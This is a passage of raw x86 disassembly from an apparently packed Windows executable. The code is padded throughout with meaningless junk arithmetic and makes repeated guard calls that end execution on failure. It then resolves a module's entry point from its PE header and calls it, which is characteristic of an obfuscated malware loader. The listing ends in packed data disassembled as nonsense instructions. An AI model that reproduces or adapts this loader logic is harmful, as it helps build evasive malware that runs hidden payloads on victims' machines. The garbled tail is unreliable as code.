  41e99e:	call   DWORD PTR ds:0x42a55e
  41e9a4:	jmp    0x41e965
  41e9a9:	mov    eax,DWORD PTR [ebp+0x10]
  41e9ac:	mov    DWORD PTR ds:0x42a412,0x1d
  41e9b6:	cmp    DWORD PTR ds:0x42a412,0x0
  41e9bd:	je     0x41e9f8
  41e9c3:	cmp    DWORD PTR ds:0x42a412,0x27
  41e9ca:	jbe    0x41e9f8
  41e9d0:	jmp    0x41e9e6
  41e9d5:	push   DWORD PTR [ebp-0x14]
  41e9d8:	push   DWORD PTR [ebp-0x20]
  41e9db:	push   0x749a
  41e9e0:	call   DWORD PTR ds:0x42a562
  41e9e6:	mov    ecx,DWORD PTR ds:0x42a412
  41e9ec:	dec    ecx
  41e9ed:	mov    DWORD PTR ds:0x42a412,ecx
  41e9f3:	jmp    0x41e9b6
  41e9f8:	mov    ds:0x4294fe,eax
  41e9fd:	mov    eax,ds:0x4292a2
  41ea02:	sub    DWORD PTR ds:0x42a3ee,edx
  41ea08:	mov    ecx,DWORD PTR [ebp-0x2c]
  41ea0b:	mov    DWORD PTR ds:0x42a3ee,0x79ec
  41ea15:	sub    eax,ebx
  41ea17:	or     DWORD PTR ds:0x42a426,0x42a43e
  41ea21:	xor    eax,edi
  41ea23:	and    DWORD PTR ds:0x42a3ce,0x7738
  41ea2d:	mov    DWORD PTR [ecx],eax
  41ea2f:	adc    DWORD PTR ds:0x42a416,0x42a3b2
  41ea39:	lea    eax,[ebp-0xc]
  41ea3c:	sbb    DWORD PTR ds:0x42a452,0x7a39
  41ea46:	mov    DWORD PTR [ebp-0x38],eax
  41ea49:	xor    DWORD PTR ds:0x42a41a,0x42a3aa
  41ea53:	lea    eax,[ebp+0x4]
  41ea56:	or     DWORD PTR ds:0x42a42e,0x42a44a
  41ea60:	mov    DWORD PTR [ebp-0xc],eax
  41ea63:	sub    DWORD PTR ds:0x42a406,0x2768
  41ea6d:	lea    eax,[ebp-0x68]
  41ea70:	and    DWORD PTR ds:0x42a3fa,0x51d9
  41ea7a:	push   eax
  41ea7b:	push   0x4296ca
  41ea80:	push   0x4296e6
  41ea85:	push   0x429716
  41ea8a:	xor    DWORD PTR ds:0x42a42a,0x6aa
  41ea94:	call   esi
  41ea96:	mov    DWORD PTR ds:0x42a42e,0x6529
  41eaa0:	shl    eax,0x15
  41eaa3:	cmp    eax,0x1800000
  41eaa8:	jne    0x41f419
  41eaae:	not    DWORD PTR ds:0x42a42a
  41eab4:	push   0x42973e
  41eab9:	call   DWORD PTR ds:0x42a54e
  41eabf:	adc    DWORD PTR ds:0x42a3d6,0x6662
  41eac9:	test   eax,eax
  41eacb:	mov    DWORD PTR ds:0x42a432,0x1a32
  41ead5:	jne    0x41f419
  41eadb:	add    DWORD PTR ds:0x42a3da,0x42a432
  41eae5:	push   0x429776
  41eaea:	call   DWORD PTR ds:0x42a556
  41eaf0:	test   eax,eax
  41eaf2:	jne    0x41f419
  41eaf8:	push   0xf
  41eafa:	lea    eax,[ebp-0x68]
  41eafd:	xor    DWORD PTR ds:0x42a3ee,0x42a3f6
  41eb07:	push   eax
  41eb08:	push   0x42978e
  41eb0d:	adc    DWORD PTR ds:0x42a3ee,0x7895
  41eb17:	push   0x4297aa
  41eb1c:	push   0x4297da
  41eb21:	call   esi
  41eb23:	shl    eax,0x15
  41eb26:	cmp    eax,0x1800000
  41eb2b:	jne    0x41f419
  41eb31:	push   0x429802
  41eb36:	call   DWORD PTR ds:0x42a54e
  41eb3c:	test   eax,eax
  41eb3e:	mov    DWORD PTR ds:0x42a41a,0x758e
  41eb48:	jne    0x41f419
  41eb4e:	sbb    DWORD PTR ds:0x42a3de,0x42a43a
  41eb58:	push   0x42983a
  41eb5d:	xor    DWORD PTR ds:0x42a422,0x75c
  41eb67:	call   DWORD PTR ds:0x42a556
  41eb6d:	test   eax,eax
  41eb6f:	mov    DWORD PTR ds:0x42a426,0x39fb
  41eb79:	jne    0x41f419
  41eb7f:	sbb    DWORD PTR ds:0x42a43a,0x7658
  41eb89:	push   0xf
  41eb8b:	lea    eax,[ebp-0x68]
  41eb8e:	push   eax
  41eb8f:	push   0x429852
  41eb94:	push   0x42986e
  41eb99:	adc    DWORD PTR ds:0x42a3ce,0x33c9
  41eba3:	push   0x42989e
  41eba8:	call   esi
  41ebaa:	mov    DWORD PTR ds:0x42a3ca,0x4f36
  41ebb4:	shl    eax,0x15
  41ebb7:	mov    DWORD PTR ds:0x42a3f2,0x71f8
  41ebc1:	cmp    eax,0x1800000
  41ebc6:	mov    DWORD PTR ds:0x42a3b2,0x6c26
  41ebd0:	jne    0x41f419
  41ebd6:	push   0x4298c6
  41ebdb:	sub    DWORD PTR ds:0x42a416,0x5c7b
  41ebe5:	call   DWORD PTR ds:0x42a54e
  41ebeb:	adc    DWORD PTR ds:0x42a406,0x42a42a
  41ebf5:	test   eax,eax
  41ebf7:	mov    DWORD PTR ds:0x42a402,0x529e
  41ec01:	jne    0x41f419
  41ec07:	or     DWORD PTR ds:0x42a3f2,0x42a3be
  41ec11:	push   0x4298fe
  41ec16:	call   DWORD PTR ds:0x42a556
  41ec1c:	adc    DWORD PTR ds:0x42a3ca,0x42a402
  41ec26:	test   eax,eax
  41ec28:	jne    0x41f419
  41ec2e:	or     DWORD PTR ds:0x42a3ae,0x1a1c
  41ec38:	push   0xf
  41ec3a:	lea    eax,[ebp-0x68]
  41ec3d:	sub    DWORD PTR ds:0x42a446,0xb4e
  41ec47:	push   eax
  41ec48:	not    DWORD PTR ds:0x42a3ae
  41ec4e:	push   0x429916
  41ec53:	sub    DWORD PTR ds:0x42a412,0x42a44a
  41ec5d:	push   0x429932
  41ec62:	xor    DWORD PTR ds:0x42a3e6,0x42a3fe
  41ec6c:	push   0x429962
  41ec71:	call   esi
  41ec73:	shl    eax,0x15
  41ec76:	mov    DWORD PTR ds:0x42a422,0x17a8
  41ec80:	cmp    eax,0x1800000
  41ec85:	mov    DWORD PTR ds:0x42a422,0x1e6c
  41ec8f:	jne    0x41f419
  41ec95:	push   0x42998a
  41ec9a:	call   DWORD PTR ds:0x42a54e
  41eca0:	sub    DWORD PTR ds:0x42a3ce,0x1b5
  41ecaa:	test   eax,eax
  41ecac:	mov    DWORD PTR ds:0x42a436,0x4a2d
  41ecb6:	jne    0x41f419
  41ecbc:	sub    DWORD PTR ds:0x42a40e,0x42a41a
  41ecc6:	push   0x4299c2
  41eccb:	call   DWORD PTR ds:0x42a556
  41ecd1:	test   eax,eax
  41ecd3:	jne    0x41f419
  41ecd9:	neg    DWORD PTR ds:0x42a43a
  41ecdf:	push   0xf
  41ece1:	lea    eax,[ebp-0x68]
  41ece4:	push   eax
  41ece5:	push   0x4299da
  41ecea:	add    DWORD PTR ds:0x42a3f6,0x3a44
  41ecf4:	push   0x4299f6
  41ecf9:	not    DWORD PTR ds:0x42a3d6
  41ecff:	push   0x429a26
  41ed04:	mov    DWORD PTR ds:0x42a416,0x1e5a
  41ed0e:	call   esi
  41ed10:	shl    eax,0x15
  41ed13:	cmp    eax,0x1800000
  41ed18:	jne    0x41f419
  41ed1e:	push   0x429a4e
  41ed23:	add    DWORD PTR ds:0x42a3fe,0x42a426
  41ed2d:	call   DWORD PTR ds:0x42a54e
  41ed33:	or     DWORD PTR ds:0x42a406,0x4619
  41ed3d:	test   eax,eax
  41ed3f:	jne    0x41f419
  41ed45:	and    DWORD PTR ds:0x42a3ca,0x42a44a
  41ed4f:	push   0x429a86
  41ed54:	xor    DWORD PTR ds:0x42a3e2,0xea8
  41ed5e:	call   DWORD PTR ds:0x42a556
  41ed64:	or     DWORD PTR ds:0x42a3aa,0x45b6
  41ed6e:	test   eax,eax
  41ed70:	mov    DWORD PTR ds:0x42a3e6,0x62c6
  41ed7a:	jne    0x41f419
  41ed80:	and    DWORD PTR ds:0x42a42e,0x5eb4
  41ed8a:	push   0xf
  41ed8c:	adc    DWORD PTR ds:0x42a3da,0x4918
  41ed96:	lea    eax,[ebp-0x68]
  41ed99:	or     DWORD PTR ds:0x42a3f6,0x42a3ae
  41eda3:	push   eax
  41eda4:	sbb    DWORD PTR ds:0x42a3f2,0x42a3b2
  41edae:	push   0x429a9e
  41edb3:	xor    DWORD PTR ds:0x42a422,0x1d8b
  41edbd:	push   0x429aba
  41edc2:	and    DWORD PTR ds:0x42a406,0x42a452
  41edcc:	push   0x429aea
  41edd1:	not    DWORD PTR ds:0x42a422
  41edd7:	call   esi
  41edd9:	shl    eax,0x15
  41eddc:	cmp    eax,0x1800000
  41ede1:	mov    DWORD PTR ds:0x42a3e2,0xbee
  41edeb:	jne    0x41f419
  41edf1:	xor    DWORD PTR ds:0x42a3b6,0x42a416
  41edfb:	push   0x429b12
  41ee00:	call   DWORD PTR ds:0x42a54e
  41ee06:	or     DWORD PTR ds:0x42a40e,0x2cef
  41ee10:	test   eax,eax
  41ee12:	jne    0x41f419
  41ee18:	push   0x429b4a
  41ee1d:	sub    DWORD PTR ds:0x42a3fe,0x42a3ea
  41ee27:	call   DWORD PTR ds:0x42a556
  41ee2d:	test   eax,eax
  41ee2f:	jne    0x41f419
  41ee35:	or     DWORD PTR ds:0x42a3fe,0x42a43e
  41ee3f:	push   0xf
  41ee41:	or     DWORD PTR ds:0x42a3ea,0x255b
  41ee4b:	lea    eax,[ebp-0x68]
  41ee4e:	and    DWORD PTR ds:0x42a406,0x42a40a
  41ee58:	push   eax
  41ee59:	add    DWORD PTR ds:0x42a3ee,0x42a452
  41ee63:	push   0x429b62
  41ee68:	push   0x429b7e
  41ee6d:	adc    DWORD PTR ds:0x42a3ca,0x42a416
  41ee77:	push   0x429bae
  41ee7c:	call   esi
  41ee7e:	shl    eax,0x15
  41ee81:	mov    DWORD PTR ds:0x42a446,0x2330
  41ee8b:	cmp    eax,0x1800000
  41ee90:	mov    DWORD PTR ds:0x42a3ce,0x5d2b
  41ee9a:	jne    0x41f419
  41eea0:	push   0x429bd6
  41eea5:	call   DWORD PTR ds:0x42a54e
  41eeab:	test   eax,eax
  41eead:	mov    DWORD PTR ds:0x42a3e2,0x284d
  41eeb7:	jne    0x41f419
  41eebd:	inc    DWORD PTR ds:0x42a3da
  41eec3:	push   0x429c0e
  41eec8:	sbb    DWORD PTR ds:0x42a3a6,0x42a3ce
  41eed2:	call   DWORD PTR ds:0x42a556
  41eed8:	test   eax,eax
  41eeda:	mov    DWORD PTR ds:0x42a3f6,0xc3a
  41eee4:	jne    0x41f419
  41eeea:	push   0xf
  41eeec:	lea    eax,[ebp-0x68]
  41eeef:	inc    DWORD PTR ds:0x42a44a
  41eef5:	push   eax
  41eef6:	push   0x429c26
  41eefb:	push   0x429c42
  41ef00:	sub    DWORD PTR ds:0x42a3ba,0x42a3ce
  41ef0a:	push   0x429c72
  41ef0f:	xor    DWORD PTR ds:0x42a3de,0x6779
  41ef19:	call   esi
  41ef1b:	mov    DWORD PTR ds:0x42a436,0x68bf
  41ef25:	shl    eax,0x15
  41ef28:	mov    DWORD PTR ds:0x42a3ba,0x5b0c
  41ef32:	cmp    eax,0x1800000
  41ef37:	mov    DWORD PTR ds:0x42a3b2,0x4026
  41ef41:	jne    0x41f419
  41ef47:	push   0x429c9a
  41ef4c:	and    DWORD PTR ds:0x42a436,0x42a3c6
  41ef56:	call   DWORD PTR ds:0x42a54e
  41ef5c:	test   eax,eax
  41ef5e:	jne    0x41f419
  41ef64:	push   0x429cd2
  41ef69:	call   DWORD PTR ds:0x42a556
  41ef6f:	test   eax,eax
  41ef71:	jne    0x41f419
  41ef77:	xor    DWORD PTR ds:0x42a3d6,0x22c0
  41ef81:	push   0xf
  41ef83:	lea    eax,[ebp-0x68]
  41ef86:	push   eax
  41ef87:	xor    DWORD PTR ds:0x42a426,0x42a442
  41ef91:	push   0x429cea
  41ef96:	and    DWORD PTR ds:0x42a3c2,0x42a42a
  41efa0:	push   0x429d06
  41efa5:	push   0x429d36
  41efaa:	dec    DWORD PTR ds:0x42a3fe
  41efb0:	call   esi
  41efb2:	mov    DWORD PTR ds:0x42a3e6,0x5803
  41efbc:	shl    eax,0x15
  41efbf:	mov    DWORD PTR ds:0x42a43e,0x7cea
  41efc9:	cmp    eax,0x1800000
  41efce:	mov    DWORD PTR ds:0x42a42e,0x15cd
  41efd8:	jne    0x41f419
  41efde:	sbb    DWORD PTR ds:0x42a452,0x6bf8
  41efe8:	push   0x429d5e
  41efed:	or     DWORD PTR ds:0x42a3ba,0x5c33
  41eff7:	call   DWORD PTR ds:0x42a54e
  41effd:	test   eax,eax
  41efff:	jne    0x41f419
  41f005:	and    DWORD PTR ds:0x42a3fe,0x42a406
  41f00f:	push   0x429d96
  41f014:	call   DWORD PTR ds:0x42a556
  41f01a:	xor    DWORD PTR ds:0x42a41a,0x1623
  41f024:	test   eax,eax
  41f026:	mov    DWORD PTR ds:0x42a3de,0x197f
  41f030:	jne    0x41f419
  41f036:	push   0xf
  41f038:	inc    DWORD PTR ds:0x42a3b6
  41f03e:	lea    eax,[ebp-0x68]
  41f041:	push   eax
  41f042:	xor    DWORD PTR ds:0x42a43a,0x42a436
  41f04c:	push   0x429dae
  41f051:	xor    DWORD PTR ds:0x42a3ea,0x6e19
  41f05b:	push   0x429dca
  41f060:	adc    DWORD PTR ds:0x42a3b6,0x42a426
  41f06a:	push   0x429dfa
  41f06f:	call   esi
  41f071:	mov    DWORD PTR ds:0x42a422,0x179c
  41f07b:	shl    eax,0x15
  41f07e:	mov    DWORD PTR ds:0x42a42a,0x7c35
  41f088:	cmp    eax,0x1800000
  41f08d:	jne    0x41f419
  41f093:	push   0x429e22
  41f098:	call   DWORD PTR ds:0x42a54e
  41f09e:	test   eax,eax
  41f0a0:	jne    0x41f419
  41f0a6:	push   0x429e5a
  41f0ab:	call   DWORD PTR ds:0x42a556
  41f0b1:	test   eax,eax
  41f0b3:	jne    0x41f419
  41f0b9:	push   0xf
  41f0bb:	lea    eax,[ebp-0x68]
  41f0be:	push   eax
  41f0bf:	push   0x429e72
  41f0c4:	push   0x429e8e
  41f0c9:	push   0x429ebe
  41f0ce:	call   esi
  41f0d0:	shl    eax,0x15
  41f0d3:	cmp    eax,0x1800000
  41f0d8:	jne    0x41f419
  41f0de:	push   0x429ee6
  41f0e3:	call   DWORD PTR ds:0x42a54e
  41f0e9:	test   eax,eax
  41f0eb:	jne    0x41f419
  41f0f1:	push   0x429f1e
  41f0f6:	call   DWORD PTR ds:0x42a556
  41f0fc:	test   eax,eax
  41f0fe:	jne    0x41f419
  41f104:	push   0xf
  41f106:	lea    eax,[ebp-0x68]
  41f109:	push   eax
  41f10a:	push   0x429f36
  41f10f:	push   0x429f52
  41f114:	push   0x429f82
  41f119:	call   esi
  41f11b:	shl    eax,0x15
  41f11e:	cmp    eax,0x1800000
  41f123:	jne    0x41f419
  41f129:	push   0x429faa
  41f12e:	call   DWORD PTR ds:0x42a54e
  41f134:	test   eax,eax
  41f136:	jne    0x41f419
  41f13c:	push   0x429fe2
  41f141:	call   DWORD PTR ds:0x42a556
  41f147:	test   eax,eax
  41f149:	jne    0x41f419
  41f14f:	mov    eax,DWORD PTR [ebp-0x20]
  41f152:	cmp    eax,0xf89c85ba
  41f157:	je     0x41f1b4
  41f15d:	mov    eax,DWORD PTR [ebp-0x4]
  41f160:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f163:	xor    eax,edi
  41f165:	add    eax,ebx
  41f167:	cmp    eax,ecx
  41f169:	je     0x41f1b4
  41f16f:	mov    eax,ds:0x42941e
  41f174:	mov    eax,DWORD PTR [eax+0x194]
  41f17a:	mov    ecx,DWORD PTR [eax]
  41f17c:	mov    eax,DWORD PTR [ecx+0x3c]
  41f17f:	push   DWORD PTR ds:0x4294fe
  41f185:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41f189:	push   DWORD PTR ds:0x4292a2
  41f18f:	add    eax,ecx
  41f191:	mov    ecx,DWORD PTR ds:0x42941e
  41f197:	mov    ecx,DWORD PTR [ecx+0x194]
  41f19d:	push   DWORD PTR [ecx]
  41f19f:	call   eax
  41f1a1:	mov    ecx,DWORD PTR ds:0x42941e
  41f1a7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41f1ad:	mov    DWORD PTR [ecx],eax
  41f1af:	jmp    0x41f3ca
  41f1b4:	mov    eax,DWORD PTR [ebp-0x4]
  41f1b7:	mov    ecx,DWORD PTR [ebp-0x34]
  41f1ba:	xor    eax,edi
  41f1bc:	add    eax,ebx
  41f1be:	cmp    eax,ecx
  41f1c0:	jne    0x41f221
  41f1c6:	mov    eax,DWORD PTR [ebp-0x4]
  41f1c9:	mov    ecx,DWORD PTR ds:0x42941e
  41f1cf:	mov    ecx,DWORD PTR [ecx+0x198]
  41f1d5:	xor    eax,edi
  41f1d7:	add    eax,ebx
  41f1d9:	cmp    eax,DWORD PTR [ecx]
  41f1db:	jne    0x41f1fe
  41f1e1:	mov    eax,DWORD PTR [ebp-0x4]
  41f1e4:	push   0xf89c85b9
  41f1e9:	xor    eax,edi
  41f1eb:	add    eax,ebx
  41f1ed:	push   eax
  41f1ee:	push   0xf89c85bd
  41f1f3:	push   DWORD PTR [ebp-0x8]
  41f1f6:	push   DWORD PTR [ebp-0x4]
  41f1f9:	call   0x41dd69
  41f1fe:	push   DWORD PTR [ebp-0x8]
  41f201:	push   DWORD PTR [ebp-0x4]
  41f204:	call   0x401000
  41f209:	mov    eax,DWORD PTR [ebp-0x4]
  41f20c:	xor    eax,edi
  41f20e:	add    eax,ebx
  41f210:	mov    ds:0x4294aa,eax
  41f215:	mov    eax,DWORD PTR [ebp-0x4]
  41f218:	xor    eax,edi
  41f21a:	add    eax,ebx
  41f21c:	mov    ds:0x4294a2,eax
  41f221:	mov    eax,DWORD PTR [ebp-0xc]
  41f224:	test   eax,eax
  41f226:	je     0x41f3ca
  41f22c:	push   0xf
  41f22e:	lea    eax,[ebp-0x68]
  41f231:	push   eax
  41f232:	push   0x429ffa
  41f237:	mov    DWORD PTR [ebp-0x3c],0xf152c32
  41f23e:	push   0x42a016
  41f243:	mov    DWORD PTR [ebp-0x40],0x712ed2f
  41f24a:	mov    DWORD PTR [ebp-0x44],0x373fc01
  41f251:	push   0x42a046
  41f256:	mov    DWORD PTR [ebp-0x48],0x72670ad1
  41f25d:	call   esi
  41f25f:	shl    eax,0x15
  41f262:	cmp    eax,0x1800000
  41f267:	jne    0x41f419
  41f26d:	push   0x42a06e
  41f272:	call   DWORD PTR ds:0x42a54e
  41f278:	test   eax,eax
  41f27a:	jne    0x41f419
  41f280:	push   0x42a0a6
  41f285:	call   DWORD PTR ds:0x42a556
  41f28b:	test   eax,eax
  41f28d:	jne    0x41f419
  41f293:	call   0x4192de
  41f298:	mov    eax,DWORD PTR [ebp-0x10]
  41f29b:	mov    eax,DWORD PTR [ebp-0x8]
  41f29e:	mov    DWORD PTR [ebp+0x10],eax
  41f2a1:	mov    eax,DWORD PTR [ebp-0x4]
  41f2a4:	mov    DWORD PTR [ebp+0xc],eax
  41f2a7:	mov    eax,eax
  41f2a9:	mov    eax,ds:0x42941e
  41f2ae:	mov    ecx,DWORD PTR [eax+0x1c0]
  41f2b4:	mov    edx,DWORD PTR [ecx]
  41f2b6:	and    DWORD PTR [ebp-0x2c],0x0
  41f2ba:	mov    esi,0xfabdbeda
  41f2bf:	add    edx,esi
  41f2c1:	adc    DWORD PTR [ebp-0x2c],0xffffffff
  41f2c5:	mov    ecx,0x8a29a13b
  41f2ca:	xor    edx,ecx
  41f2cc:	mov    DWORD PTR [ebp-0x28],edx
  41f2cf:	mov    edx,DWORD PTR [ebp-0x2c]
  41f2d2:	xor    edx,0x0
  41f2d5:	cmp    DWORD PTR [ebp-0x28],0x70941fe0
  41f2dc:	mov    DWORD PTR [ebp-0x24],edx
  41f2df:	jne    0x41f310
  41f2e5:	cmp    edx,0xffffffff
  41f2e8:	jne    0x41f310
  41f2ee:	mov    eax,ds:0x4294a2
  41f2f3:	mov    edx,DWORD PTR ds:0x4294aa
  41f2f9:	xor    eax,edx
  41f2fb:	mov    ds:0x4294a2,eax
  41f300:	mov    edx,DWORD PTR ds:0x4294a2
  41f306:	mov    eax,DWORD PTR [ebp-0xc]
  41f309:	add    DWORD PTR [eax],edx
  41f30b:	jmp    0x41f38c
  41f310:	mov    eax,DWORD PTR [eax+0x1c8]
  41f316:	mov    eax,DWORD PTR [eax]
  41f318:	cdq    
  41f319:	add    eax,esi
  41f31b:	adc    edx,0xffffffff
  41f31e:	and    DWORD PTR [ebp-0x2c],0x0
  41f322:	xor    edx,0x0
  41f325:	mov    DWORD PTR [ebp-0x14],edx
  41f328:	mov    edx,DWORD PTR [ebp+0xc]
  41f32b:	mov    DWORD PTR [ebp-0x30],edx
  41f32e:	xor    eax,ecx
  41f330:	add    DWORD PTR [ebp-0x30],esi
  41f333:	mov    edx,DWORD PTR [ebp-0x30]
  41f336:	adc    DWORD PTR [ebp-0x2c],0xffffffff
  41f33a:	xor    edx,ecx
  41f33c:	mov    DWORD PTR [ebp-0x28],edx
  41f33f:	mov    edx,DWORD PTR [ebp-0x2c]
  41f342:	xor    edx,0x0
  41f345:	mov    DWORD PTR [ebp-0x24],edx
  41f348:	cmp    DWORD PTR [ebp-0x28],eax
  41f34b:	jne    0x41f35c
  41f351:	mov    eax,DWORD PTR [ebp-0x14]
  41f354:	cmp    edx,eax
  41f356:	je     0x41f36a
  41f35c:	mov    eax,DWORD PTR [ebp+0xc]
  41f35f:	add    eax,DWORD PTR [ebp+0x10]
  41f362:	mov    DWORD PTR [ebp+0xc],eax
  41f365:	jmp    0x41f3ca
  41f36a:	mov    eax,ds:0x4294a2
  41f36f:	mov    edx,DWORD PTR ds:0x4294aa
  41f375:	xor    eax,edx
  41f377:	mov    ds:0x4294a2,eax
  41f37c:	mov    eax,DWORD PTR [ebp-0xc]
  41f37f:	mov    edx,DWORD PTR ds:0x4294a2
  41f385:	add    edx,DWORD PTR [eax]
  41f387:	mov    eax,DWORD PTR [ebp-0xc]
  41f38a:	mov    DWORD PTR [eax],edx
  41f38c:	mov    edx,DWORD PTR [ebp+0xc]
  41f38f:	mov    eax,ds:0x4294a2
  41f394:	xor    edx,edi
  41f396:	add    edx,ebx
  41f398:	xor    ebx,ebx
  41f39a:	add    edx,esi
  41f39c:	adc    ebx,0xffffffff
  41f39f:	xor    edi,edi
  41f3a1:	xor    edx,ecx
  41f3a3:	xor    ebx,0x0
  41f3a6:	add    eax,esi
  41f3a8:	adc    edi,0xffffffff
  41f3ab:	xor    eax,ecx
  41f3ad:	xor    edi,0x0
  41f3b0:	cmp    eax,edx
  41f3b2:	jne    0x41f3ca
  41f3b8:	cmp    edi,ebx
  41f3ba:	jne    0x41f3ca
  41f3c0:	mov    eax,ds:0x4294a2
  41f3c5:	mov    ds:0x4294aa,eax
  41f3ca:	push   0xf
  41f3cc:	lea    eax,[ebp-0x68]
  41f3cf:	push   eax
  41f3d0:	push   0x42a0be
  41f3d5:	push   0x42a0da
  41f3da:	push   0x42a10a
  41f3df:	call   DWORD PTR ds:0x42a552
  41f3e5:	shl    eax,0x15
  41f3e8:	cmp    eax,0x1800000
  41f3ed:	jne    0x41f419
  41f3f3:	push   0x42a132
  41f3f8:	call   DWORD PTR ds:0x42a54e
  41f3fe:	test   eax,eax
  41f400:	jne    0x41f419
  41f406:	push   0x42a16a
  41f40b:	call   DWORD PTR ds:0x42a556
  41f411:	test   eax,eax
  41f413:	je     0x41f420
  41f419:	xor    eax,eax
  41f41b:	jmp    0x41f43b
  41f420:	mov    eax,ds:0x42941e
  41f425:	push   0x4
  41f427:	add    eax,0x1cc
  41f42c:	push   eax
  41f42d:	lea    eax,[ebp-0x10]
  41f430:	push   eax
  41f431:	call   0x41f442
  41f436:	mov    eax,DWORD PTR [ebp-0x10]
  41f439:	mov    eax,DWORD PTR [eax]
  41f43b:	pop    ebx
  41f43c:	pop    edi
  41f43d:	pop    esi
  41f43e:	leave  
  41f43f:	ret    0xc
  41f442:	push   ebp
  41f443:	mov    ebp,esp
  41f445:	sub    esp,0x10
  41f448:	or     edx,edx
  41f44a:	mov    eax,0xf89c85b9
  41f44f:	sub    ecx,ecx
  41f451:	mov    DWORD PTR [ebp-0x4],eax
  41f454:	mov    edx,DWORD PTR ds:0x42a452
  41f45a:	adc    DWORD PTR ds:0x42a43a,edx
  41f460:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  41f467:	sub    edx,DWORD PTR ds:0x42a3be
  41f46d:	mov    ecx,DWORD PTR [ebp-0x4]
  41f470:	and    DWORD PTR ds:0x42a3ba,edi
  41f476:	jmp    0x4217f3
  41f47b:	and    esi,DWORD PTR [esi]
  41f47d:	push   0xfb046716
  41f482:	sti    
  41f483:	shl    BYTE PTR [ebx],cl
  41f485:	(bad)  
  41f486:	jg     0x41f49c
  41f488:	jmp    0xd1f0ef3e
  41f48d:	jns    0x41f509
  41f48f:	sbb    bl,BYTE PTR [edi+0x7a]
  41f492:	jp     0x41f454
  41f494:	add    al,0xde
  41f496:	pop    ecx
  41f497:	mov    dh,0x5f
  41f499:	adc    ecx,DWORD PTR [ebp-0x6b]
  41f49c:	or     eax,0x4b07a23e
  41f4a1:	in     al,dx
  41f4a2:	fisttp WORD PTR [eax+eiz*8]
  41f4a5:	push   ebx
  41f4a6:	cmp    dl,BYTE PTR [ebx+0x6e]
  41f4a9:	outs   dx,DWORD PTR ds:[esi]
  41f4aa:	pop    ss
  41f4ab:	icebp  
  41f4ac:	out    dx,eax
  41f4ad:	mov    ebx,0xfe709b45
  41f4b2:	cmp    DWORD PTR [edx],edi
  41f4b4:	inc    ecx
  41f4b5:	outs   dx,BYTE PTR ds:[esi]
  41f4b6:	jmp    0x41f520
  41f4b8:	and    esp,ebp
  41f4ba:	(bad)  
  41f4bb:	ficom  DWORD PTR [esi]
  41f4bd:	xchg   DWORD PTR [ebx-0xe],esp
  41f4c0:	ds in  eax,dx
  41f4c2:	je     0x41f4c7
  41f4c4:	out    dx,al
  41f4c5:	mov    WORD PTR ds:[ebx-0xf],ds
  41f4c9:	mov    DWORD PTR [ebx-0x47bfbece],ebp
  41f4cf:	push   esi
  41f4d0:	adc    ah,cl
  41f4d2:	xor    DWORD PTR [edx+0x33a115fa],ebp
  41f4d8:	sub    dh,dh
  41f4da:	mov    al,ds:0xb2202e7e
  41f4df:	jmp    DWORD PTR [edx]
  41f4e1:	add    esi,DWORD PTR [edx]
  41f4e3:	mov    dl,0x8e
  41f4e5:	test   DWORD PTR [edx+0x7e],edi
  41f4e8:	and    ch,ch
  41f4ea:	rcl    eax,1
  41f4ec:	mov    al,ds:0x88e36117
  41f4f1:	aad    0xfe
  41f4f3:	(bad)
  41f4f7:	mov    ch,0x85
  41f4f9:	cmc    
  41f4fa:	call   0x8d6:0xaf2354eb
  41f501:	pusha  
  41f502:	push   ebx
  41f503:	fsubr  DWORD PTR [esi]
  41f505:	dec    edi
  41f506:	push   esp
  41f507:	and    DWORD PTR [edi-0x3e8b7043],ebx
  41f50d:	(bad)  [ebp-0x3d]
  41f510:	dec    edi
  41f511:	push   ss
  41f512:	sbb    ebx,DWORD PTR [ebx-0x5320832d]
  41f518:	pop    ss
  41f519:	fadd   QWORD PTR [eax+0x6c]
  41f51c:	and    al,0x1b
  41f51e:	sub    al,0x15
  41f520:	in     al,0x1
  41f522:	push   ebp
  41f523:	cmp    eax,DWORD PTR [esi+0x6e]
  41f526:	adc    BYTE PTR es:[ecx],0x92
  41f52a:	cli    
  41f52b:	sbb    eax,0x8a6d82a0
  41f530:	dec    edi
  41f531:	cdq    
  41f532:	xchg   ebp,eax
  41f533:	mov    al,ds:0x589127d7
  41f538:	rcl    BYTE PTR [edi+0x53],1
  41f53b:	fcomip st,st(7)
  41f53d:	mov    eax,ds:0x88bf61dc
  41f542:	xlat   BYTE PTR ds:[ebx]
  41f543:	cs popa 
  41f545:	mov    ds:0x93ca25f6,eax
  41f54a:	xchg   edi,eax
  41f54b:	pop    es
  41f54c:	cmp    bh,dl
  41f54e:	jbe    0x41f4e8
  41f550:	mov    edi,0xd1ed5590
  41f555:	les    ebp,FWORD PTR [ebx+0x633c383d]
  41f55b:	inc    eax
  41f55c:	in     al,dx
  41f55d:	mov    edi,DWORD PTR [ebx]
  41f55f:	adc    al,0xa8
  41f561:	retf   
  41f562:	and    ebx,DWORD PTR [edi-0x1a658fae]
  41f568:	es push eax
  41f56a:	add    ah,BYTE PTR [esi+0x12]
  41f56d:	xor    bh,bh
  41f56f:	daa    
  41f570:	sti    
  41f571:	dec    edi
  41f572:	inc    edi
  41f573:	dec    edi
  41f574:	fld    TBYTE PTR [ebp-0x73]
  41f577:	stos   BYTE PTR es:[edi],al
  41f578:	lods   al,BYTE PTR ds:[esi]
  41f579:	(bad)  
  41f57b:	push   eax
  41f57c:	and    BYTE PTR [esi-0x110e53cc],ah
  41f582:	mov    dh,ch
  41f584:	dec    ebp
  41f585:	xlat   BYTE PTR ds:[ebx]
  41f586:	gs aad 0xd6
  41f589:	out    dx,al
  41f58a:	stos   DWORD PTR es:[edi],eax
  41f58b:	push   edx
  41f58c:	push   es
  41f58d:	lods   eax,DWORD PTR ds:[esi]
  41f58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f58f:	lea    esp,[ebx+0x7ebc7902]
  41f595:	cdq    
  41f596:	fisubr DWORD PTR [edx]
  41f598:	adc    cl,BYTE PTR [edi-0x7e]
  41f59b:	je     0x41f5fb
  41f59d:	neg    BYTE PTR [eax+0x6f5409d1]
  41f5a3:	(bad)
  41f5a6:	or     al,0x1
  41f5a8:	sahf   
  41f5a9:	xor    al,0xfa
  41f5ab:	fldenv [ebx]
  41f5ad:	bound  ecx,QWORD PTR [ebx+0x124ab8ce]
  41f5b3:	stc    
